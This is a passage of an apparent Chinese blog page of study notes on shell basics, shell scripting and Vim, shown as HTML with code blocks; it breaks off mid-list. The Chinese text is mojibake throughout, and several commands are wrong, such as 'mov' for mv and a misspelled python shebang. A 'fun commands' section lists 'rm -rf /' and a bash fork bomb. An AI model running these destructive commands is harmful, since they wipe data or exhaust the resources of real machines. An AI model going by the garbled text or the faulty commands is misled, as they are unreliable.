class="line"><span class="comment"># `..` ä»£è¡¨ä¸Šä¸€çº§ç›®å½•ã€‚`.` ä»£è¡¨å½“å‰ç›®å½• </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  å½“å‰ç›®å½•å’Œä¹‹å‰ç›®å½•ä¸‹åˆ‡æ¢</span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰è¶£çš„ä¸€ç‚¹æ˜¯ï¼Œ`..`ä½¿ç”¨è¿‡å¤šçš„æƒ…å†µã€‚`/`ç›®å½•æ²¡æœ‰ä¸Šä¸€çº§ï¼Œæœ€é«˜åªèƒ½åˆ° `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶æ“ä½œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  list: åˆ—å‡ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ï¼Œé»˜è®¤å½“å‰ç›®å½•</span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»åŠ¨æ–‡ä»¶ä½ç½® move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># é‡å‘½å</span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶ copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤</span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span class="comment"># rm -r ä¹Ÿè¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶æ‰€æœ‰å†…å®¹</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶å¼€å¤´ç»“å°¾ï¼Œé»˜è®¤10è¡Œ</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat é‡å®šå‘</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># å¦‚æœæ²¡æœ‰å°±åˆ›å»ºtmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># åŒä¸Š</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; ä¼šæ¸…é™¤åŸå…ˆå†…å®¹ã€‚&gt;&gt; ä»£è¡¨appendï¼Œè¿½åŠ è€Œä¸æ¸…é™¤</span></span><br></pre></td></tr></table></figure><ul><li>å‘½ä»¤å‚æ•°å’Œå¸®åŠ©æ–‡æ¡£</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸€èˆ¬å‘½ä»¤ä¹Ÿå­˜åœ¨å‚æ•°ï¼Œä¸€èˆ¬ä¸º -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: æƒé™Read, Write, eXecute(ä¹Ÿä»£è¡¨æ˜¯å¦èƒ½å¤Ÿè®¿é—®æ­¤ç›®å½•)ã€‚</span></span><br><span class="line"><span class="comment"># ä»å‰åˆ°å: owneræƒé™ groupæƒé™ å…¶ä½™ç”¨æˆ·æƒé™ owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥å¸®åŠ©æ–‡æ¡£ï¼Œqé€€å‡ºã€‚manual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure><ul><li>ç®¡é“ï¼šå·¦ä¾§çš„è¾“å‡ºä½œä¸ºå³ä¾§çš„è¾“å…¥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 æœ€åä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰æ—¶å€™ç»™rootæƒé™æ–‡ä»¶å†™å…¥æ—¶ï¼Œæ¯”å¦‚sudo echo 123 &gt; tmp.txtä¼šæŠ¥é”™ï¼Œå¯ç”¨ä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure><ul><li>root user: è¶…çº§ç®¡ç†å‘˜ã€‚å°½é‡å°‘ç”¨ï¼Œåœ¨è¿è¡Œé”™è¯¯çš„ç¨‹åºæ—¶ä¼šç ´åè®¡ç®—æœºã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”¨æˆ·ä½¿ç”¨rootæƒé™</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` ä»£è¡¨root æƒé™ </span></span><br></pre></td></tr></table></figure><ul><li><p><code>/sys</code> æ–‡ä»¶å¤¹ï¼šå„ç§å†…æ ¸å‚æ•°ï¼Œæ˜¾ç¤ºè®¾å¤‡çš„çŠ¶æ€ã€‚linuxç³»ç»Ÿå°†å…¶è§†ä¸ºæ–‡ä»¶æš´æ¼ç»™ç”¨æˆ·ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ“ä½œä»è€Œæ§åˆ¶æŸäº›è®¾å¤‡</p></li><li><p>æœ‰è¶£çš„å‘½ä»¤</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ åº“è·‘è·¯ï¼Œæ— éœ€ç¡®è®¤å¼ºåˆ¶åˆ é™¤æ‰€æœ‰çš„æ–‡ä»¶</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork ç‚¸å¼¹, ä¼šè€—å°½ç”µè„‘èµ„æº</span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment"># ç†è§£ä¸ºä¸€ä¸ªå‡½æ•°é€’å½’è°ƒç”¨ `:` ä¸ºå‡½æ•°å</span></span><br><span class="line">:() &#123;</span><br><span class="line">: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºlsæ‰“é”™é¢‘ç‡æ¯”è¾ƒé«˜ï¼Œä¼šå‡ºç°ä¸€ä¸ªåŠ¨ç”»(ç«è½¦)</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay æ‰“å°ä¸€æ®µè¯ cowthink ç±»ä¼¼ï¼Œä½†æ˜¯think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">-l æŸ¥çœ‹åŠ¨ç‰©ï¼Œéœ€è¦å®‰è£…</span><br><span class="line">-f æŒ‡å®šåŠ¨ç‰©</span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet å­—ç¬¦å­—  toiletç±»ä¼¼ </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°ä¸€å †ä¿¡æ¯å’Œlogoï¼Œè£…bä½¿ç”¨</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure><ul><li>ç°ä»£åŒ–çš„å‘½ä»¤ï¼šå¼€å‘è€…ä½¿ç”¨rustå†™äº†å¾ˆå¤šæ›´åŠ ç°ä»£çš„å‘½ä»¤ï¼Œå¯ä»¥æ›¿ä»£ä¸€äº›è€å‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure><h4 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul><li>shell, console, terminal?</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure><h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2><blockquote><p>Linux è„šæœ¬çš„ä½¿ç”¨</p></blockquote><ul><li>è¯­æ³•</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$0</span>      è¿è¡Œæ–‡ä»¶å</span><br><span class="line"><span class="variable">$1</span>-<span class="variable">$9</span>   å‚æ•°</span><br><span class="line">$?      è·å–ä¸Šä¸€ä¸ªè¿è¡Œçš„é”™è¯¯ 0ä»£è¡¨æ­£ç¡®ï¼Œ1ä»£è¡¨å‡ºé”™</span><br><span class="line"><span class="variable">$_</span>      å­˜å‚¨ä¸Šæ¬¡è¿è¡Œçš„ç»“æœ</span><br><span class="line"><span class="variable">$#</span>      å‚æ•°ä¸ªæ•°</span><br><span class="line">$$      è¿›ç¨‹<span class="built_in">id</span></span><br><span class="line"><span class="variable">$@</span>      æ‰€æœ‰çš„å‚æ•°ç»„æˆï¼Œå¯è¿­ä»£</span><br><span class="line"></span><br><span class="line">!!      åœ¨æ‰§è¡Œæ—¶ä¼šæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line"><span class="comment"># å˜é‡</span></span><br><span class="line">foo=bar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$foo</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡èµ‹å€¼ä¸ºå‘½ä»¤çš„ç»“æœ</span></span><br><span class="line">foo=$(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure><ul><li>å¾ªç¯</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> xxx; <span class="keyword">do</span>... <span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li>æ¡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> xxx; then...fi</span><br></pre></td></tr></table></figure><ul><li>ç¼–ç¨‹è„šæœ¬</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŠ å…¥magic line æŒ‡å®šè§£æå™¨</span></span><br><span class="line"><span class="comment"># ä¸€ä¸ª ç§°ä¹‹ä¸º `shebang` çš„ä¸œè¥¿</span></span><br><span class="line"><span class="comment">#!/usr/bin/pyton3</span></span><br></pre></td></tr></table></figure><ul><li><code>man</code> å‘½ä»¤çš„å…¶ä½™é€‰æ‹© <code>tldr</code> ï¼Œæ›´åŠ ç®€æ´(too long; donâ€™t read)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tldr tar</span><br></pre></td></tr></table></figure><ul><li>é€’å½’æŸ¥è¯¢</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find .     <span class="comment"># . ä»£è¡¨å½“å‰è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šæ¯”å¦‚ `/` </span></span><br><span class="line">-name  <span class="comment"># åç§°,å¯ä»¥ä½¿ç”¨é€šé…ç¬¦</span></span><br><span class="line">-<span class="built_in">type</span>  <span class="comment"># ç±»å‹ d(dir) f(file)</span></span><br><span class="line">-mtime -1 <span class="comment"># ä¿®æ”¹æ—¶é—´modify timeï¼Œ 1æŒ‡1å¤©</span></span><br><span class="line">-<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;   <span class="comment"># å¯¹äºå¯»æ‰¾çš„æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ \; ä¸å¯ç¼ºå°‘</span></span><br><span class="line"></span><br><span class="line">fd  <span class="comment"># æ›´åŠ ç°ä»£åŒ–çš„find</span></span><br><span class="line"></span><br><span class="line">locate  <span class="comment"># é»˜è®¤æŸ¥æ‰¾æ•´ä¸ªè®¡ç®—æœº</span></span><br><span class="line"></span><br><span class="line">grep  <span class="comment"># åº”ç”¨äºæŸ¥æ–‡ä»¶å†…å®¹</span></span><br><span class="line">-R  <span class="comment">#  é€’å½’</span></span><br><span class="line"></span><br><span class="line">rg  <span class="comment"># ripgrep</span></span><br></pre></td></tr></table></figure><ul><li>æŸ¥æ‰¾ä½¿ç”¨è¿‡çš„å‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ–¹å‘é”®çš„ä¸Š</span><br><span class="line"></span><br><span class="line">fzf</span><br><span class="line"></span><br><span class="line">zsh çš„ä¸€ä¸ªæ’ä»¶ï¼Œåœ¨è¾“å…¥æ—¶ä¼šæ˜¾ç¤ºæ›¾ç»è¾“å…¥çš„ç±»ä¼¼å‘½ä»¤</span><br></pre></td></tr></table></figure><ul><li>æ›´æ¸…æ™°çš„ç›®å½•ç»“æ„</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tree</span><br><span class="line">broot</span><br></pre></td></tr></table></figure><h2 id="lecture3-editor-VIM"><a href="#lecture3-editor-VIM" class="headerlink" title="lecture3: editor VIM"></a>lecture3: editor VIM</h2><ul><li><p>normal mode: å¯ä»¥æ§åˆ¶å…‰æ ‡ï¼Œæ‰§è¡Œå‘½ä»¤â€¦</p></li><li><p>insert mode: å°±æ˜¯æ–‡æœ¬ç¼–è¾‘å™¨ã€‚</p></li><li><p>command mode: åœ¨insert mode è¾“å…¥ <code>:</code> åœ¨è¾“å…¥å‘½ä»¤</p></li><li><p>visual mode: æœ‰ç‚¹åƒä½¿ç”¨é¼ æ ‡é€‰ä¸­ä¸€å—è¿ç»­åŒºåŸŸ</p></li><li><p>replace mode</p></li><li><p>è¿›å…¥ insert mode</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i   <span class="keyword">insert</span>ï¼Œ åœ¨å…‰æ ‡å‰æ’å…¥</span><br><span class="line"><span class="keyword">a</span>   <span class="keyword">append</span>ï¼Œåœ¨å…‰æ ‡å</span><br><span class="line">I   è¡Œé¦–</span><br><span class="line">A   è¡Œå°¾</span><br><span class="line"><span class="keyword">o</span>   ä¸‹ä¸€è¡Œ <span class="keyword">open</span> <span class="keyword">a</span> <span class="keyword">new</span> <span class="built_in">line</span></span><br><span class="line">O   ä¸Šä¸€è¡Œ</span><br></pre></td></tr></table></figure><ul><li>normal mode</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esc  ä¹Ÿå¯ä»¥è‡ªè¡Œé…ç½®</span><br></pre></td></tr></table></figure><ul><li><p>ä¿å­˜ï¼Œé€€å‡º</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- <span class="keyword">write</span> <span class="keyword">quit</span></span><br><span class="line"><span class="keyword">normal</span> <span class="keyword">mode</span> ä¸‹ :<span class="keyword">wq</span></span><br><span class="line"></span><br><span class="line">-- åŠ å…¥ ! ä»£è¡¨å¼ºåˆ¶æ‰§è¡Œ</span><br></pre></td></tr></table></figure></li><li><p>normal mode å…‰æ ‡æ“ä½œã€‚</p><ul><li>æ‰€æœ‰çš„éƒ½å¯ä»¥åœ¨<code>å‰é¢åŠ ä¸€ä¸ªæ•°å­—</code>ï¼Œä»£è¡¨count</li></ul></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">h   å·¦ç§»</span><br><span class="line"><span class="keyword">j</span>   ä¸‹</span><br><span class="line"><span class="keyword">k</span>   ä¸Š</span><br><span class="line"><span class="keyword">l</span>   å³</span><br><span class="line"></span><br><span class="line"><span class="keyword">w</span>   å‘å‰(åä¸€ä¸ªå•è¯)ç§»åŠ¨ä¸€ä¸ª word, ä¹Ÿå°±æ˜¯ä¸€ä¸ªå•è¯ï¼Œæ ‡ç‚¹æˆ–è€…ç©ºæ ¼åˆ†å¼€ã€‚åœ¨å•è¯ç¬¬ä¸€ä¸ªå­—æ¯</span><br><span class="line"><span class="keyword">b</span>   å‘backç§»åŠ¨ word      back of word</span><br><span class="line"><span class="keyword">e</span>   ç§»åŠ¨åˆ°å•è¯æœ«å°¾        end of word</span><br><span class="line"><span class="number">0</span>   ç§»åŠ¨åˆ°è¡Œé¦–</span><br><span class="line">$   è¡Œå°¾</span><br><span class="line">^   ä¸€è¡Œç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦</span><br><span class="line"></span><br><span class="line">ctrl-<span class="keyword">u</span>     <span class="keyword">up</span>ç±»ä¼¼é¼ æ ‡å‘ä¸Šæ»šåŠ¨</span><br><span class="line">ctrl-d     down å‘ä¸‹</span><br><span class="line"></span><br><span class="line">H  highest  å±å¹•ç¬¬ä¸€è¡Œ</span><br><span class="line">L  low      å±å¹•æœ€åä¸€è¡Œ</span><br><span class="line">M  mid      å±å¹•ä¸­é—´ä¸€è¡Œ</span><br></pre></td></tr></table></figure><p>åˆ é™¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d  åˆ é™¤ä¸€ä¸ªå­—ç¬¦,é…åˆç§»åŠ¨å…‰æ ‡ä½¿ç”¨</span><br><span class="line">dd åˆ é™¤ä¸€è¡Œï¼Œå¯ä»¥ä½¿ç”¨<span class="keyword">p</span></span><br><span class="line">D åˆ é™¤è‡³æœ«å°¾</span><br><span class="line">d1G åˆ é™¤åˆ°ç¬¬ä¸€è¡Œ</span><br><span class="line">dG  åˆ é™¤åˆ°æœ€åä¸€è¡Œ</span><br><span class="line">n1, n2d åˆ é™¤n1-n2è¡Œ</span><br><span class="line">-- åœ¨è¿™é‡Œ <span class="keyword">a</span> around;  i inside</span><br><span class="line"><span class="keyword">di</span>(  åˆ é™¤æ‹¬å·å†…çš„å†…å®¹</span><br><span class="line">da(  åˆ é™¤åŒ…æ‹¬æ‹¬å·çš„ä¸œè¥¿</span><br><span class="line"><span class="keyword">c</span>   <span class="keyword">change</span> <span class="keyword">a</span> word åˆ é™¤(d ç±»ä¼¼)å¹¶è¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>   åˆ é™¤åé¢ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"><span class="symbol">&lt;num&gt;</span><span class="keyword">x</span> åˆ é™¤åé¢numä¸ªå­—ç¬¦</span><br><span class="line">s   åˆ é™¤å­—ç¬¦è¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span></span><br><span class="line">S   åˆ é™¤ä¸€è¡Œè¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><ul><li>å¤åˆ¶ç²˜è´´</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">y</span>   <span class="keyword">yank</span> </span><br><span class="line">yy å¤åˆ¶å½“å‰è¡Œ</span><br><span class="line">y1G ...</span><br><span class="line"><span class="keyword">p</span>   pasteåœ¨è¿™ä¸€è¡Œåé¢</span><br><span class="line"><span class="keyword">P</span>   è¿™ä¸€è¡Œå‰é¢</span><br></pre></td></tr></table></figure><ul><li>è·³è½¬åˆ°æŸä¸€è¡Œ</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g</span><br><span class="line">gg ç¬¬ä¸€è¡Œ</span><br><span class="line">G   æœ€åä¸€è¡Œ</span><br><span class="line"><span class="symbol">&lt;num&gt;</span>G  è·³è½¬åˆ°numè¡Œ</span><br><span class="line">:<span class="symbol">&lt;num&gt;</span>   è·³åˆ°ç¬¬numè¡Œ</span><br></pre></td></tr></table></figure><ul><li>æ’¤é”€ä¹‹å‰çš„æ“ä½œ</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">u</span> <span class="keyword">undo</span></span><br><span class="line">ctrl + r   <span class="keyword">redo</span> æ¢å¤æ’¤é”€çš„å†…å®¹</span><br></pre></td></tr></table></figure><ul><li>visual mode: å…è®¸æˆ‘ä»¬æ”¹å˜ä¸€åˆ—ï¼Œæ•´å—å¤åˆ¶ç­‰</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v   å­—ç¬¦å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸä¸¤ä¸ªå­—ç¬¦ä¸­é—´æ‰€æœ‰å†…å®¹ï¼Œé€€å‡ºæŒ‰v</span><br><span class="line">V   è¡Œå¯è§†è¡Œï¼Œå…‰æ ‡æ‰€åœ¨è¡Œï¼Œé€€å‡º V</span><br><span class="line">ctrl+v   å—å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸå…‰æ ‡çš„çŸ©é˜µï¼Œé€€å‡ºctrl+v</span><br></pre></td></tr></table></figure><ul><li>æœç´¢</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">f</span><span class="symbol">&lt;word&gt;</span>  æœ¬è¡ŒæŸ¥æ‰¾</span><br><span class="line">/<span class="symbol">&lt;word&gt;</span>  æŸ¥å†…å®¹,å…¨æ–‡</span><br><span class="line">n      ç»§ç»­å‘ä¸‹ç»§ç»­æ‰¾ <span class="keyword">next</span></span><br><span class="line"><span class="keyword">N</span>      ç»§ç»­å‘ä¸Šæ‰¾</span><br></pre></td></tr></table></figure><ul><li>æ›´æ”¹ç¯å¢ƒ</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span>   æ˜¾ç¤ºè¡Œå·</span><br></pre></td></tr></table></figure><ul><li><p><code>~</code> åè½¬å¤§å°å†™</p></li><li><p>æ‹¬å·åŒ¹é…</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%   åˆ°åŒ¹é…çš„å¦ä¸€ä¸ªæ‹¬å·å¤„</span><br></pre></td></tr></table></figure><ul><li>tab, window, buffer</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tab: 